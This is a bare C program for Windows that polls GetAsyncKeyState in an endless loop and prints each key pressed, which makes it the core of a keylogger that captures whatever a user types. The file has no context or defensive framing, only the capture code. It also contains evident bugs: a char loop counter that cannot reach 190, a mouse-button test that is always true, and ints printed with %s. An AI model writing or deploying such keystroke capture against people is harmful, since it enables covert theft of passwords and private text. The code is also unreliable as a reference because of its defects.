#include <stdio.h>
#include <windows.h>

void print_key(int key)
{



if (key==8)
	fprintf(stdout,"%s","[del]");

if (key==13)
	fprintf(stdout,"%s","\n");
if (key==32)
	fprintf(stdout,"%s"," ");
if (key==VK_CAPITAL)
	fprintf(stdout,"%s","[Caps]");
if (key==VK_TAB)
	fprintf(stdout,"%s","[TAB]");
if (key ==VK_SHIFT)
	fprintf(stdout,"%s","[SHIFT]");
if (key ==VK_CONTROL)
	fprintf(stdout,"%s","[CTRL]");
if (key ==VK_PAUSE)
	fprintf(stdout,"%s","[PAUSE]");
if (key ==VK_KANA)
	fprintf(stdout,"%s","[Kana]");
if (key ==VK_ESCAPE)
	fprintf(stdout,"%s","[ESC]");
if (key ==VK_END)
	fprintf(stdout,"%s","[END]");
if (key==VK_HOME)
	fprintf(stdout,"%s","[HOME]");
if (key ==VK_LEFT)
	fprintf(stdout,"%s","[LEFT]");
if (key ==VK_UP)
	fprintf(stdout,"%s","[UP]");
if (key ==VK_RIGHT)
	fprintf(stdout,"%s","[RIGHT]");
if (key ==VK_DOWN)
	fprintf(stdout,"%s","[DOWN]");
if (key ==VK_SNAPSHOT)
	fprintf(stdout,"%s","[PRINT]");
if (key ==VK_NUMLOCK)
	fprintf(stdout,"%s","[NUM LOCK]");
if (key ==190 || key==110)
	fprintf(stdout,"%s",".");
if (key >=96 && key <= 105){
    key = key - 48;
    fprintf(stdout,"%s",&key);
}

if (key >=48 && key <= 59)
	fprintf(stdout,"%s",&key);

if (key !=VK_LBUTTON || key !=VK_RBUTTON){
    if (key >=65 && key <=90){
        if (GetKeyState(VK_CAPITAL))
           fprintf(stdout,"%s",&key);
		else
		{
			key = key +32;
			fprintf(stdout,"%s",&key);
		}
	}
}
}

int main()
{
char i;
while(1){    
    for(i=8;i<=190;i++){
		if (GetAsyncKeyState(i) == -32767)
	     {
		    print_key (i);
		 }
	}
}

}
